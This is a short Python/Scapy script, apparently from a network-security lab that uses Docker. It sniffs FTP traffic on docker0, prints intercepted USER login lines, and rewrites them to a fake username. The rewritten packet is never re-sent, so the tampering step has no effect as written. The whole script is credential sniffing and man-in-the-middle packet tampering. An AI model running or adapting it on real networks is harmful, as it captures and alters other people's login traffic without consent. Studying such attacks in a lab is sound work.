from scapy.all import *

def modificar_user(pkt):
    if pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode(errors='ignore')
        if 'USER' in payload:
            print(f"[ORIGINAL] {payload.strip()}")
            pkt[Raw].load = b"USER usuario_falso\r\n"
            del pkt[IP].chksum
            del pkt[TCP].chksum
            print("[MODIFICADO] USER usuario_falso")

print("Interceptando trÃ¡fico FTP... esperando USER")
sniff(filter="tcp port 21", prn=modificar_user, iface="docker0")
